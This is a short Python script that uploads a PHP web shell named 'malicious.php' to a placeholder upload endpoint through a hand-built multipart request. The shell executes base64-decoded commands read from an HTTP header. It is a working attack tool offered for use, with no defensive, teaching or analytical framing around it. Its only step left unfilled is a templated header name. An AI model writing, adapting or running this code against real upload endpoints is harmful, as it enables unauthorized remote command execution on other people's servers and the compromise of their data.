import requests
import random
import string

# Define target URL and other parameters
target_url = "https://target.com/upload"
shell_filename = "malicious.php"
shell_content = "<?php if(isset($_SERVER['HTTP_{{header}}'])){system(base64_decode($_SERVER['HTTP_{{header}}']));} ?>"
boundary = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))

# Create the HTTP request with multipart/form-data
payload = f"--{boundary}\r\n"
payload += f'Content-Disposition: form-data; name="file"; filename="{shell_filename}"\r\n'
payload += "Content-Type: application/octet-stream\r\n\r\n"
payload += shell_content + "\r\n"
payload += f"--{boundary}--\r\n"

headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}",
    "User-Agent": "Mozilla/5.0"
}

# Send the request
response = requests.post(target_url, data=payload, headers=headers)

# Check if the shell was successfully uploaded
if response.status_code == 200:
    print("Shell uploaded successfully.")
else:
    print("Failed to upload the shell.")
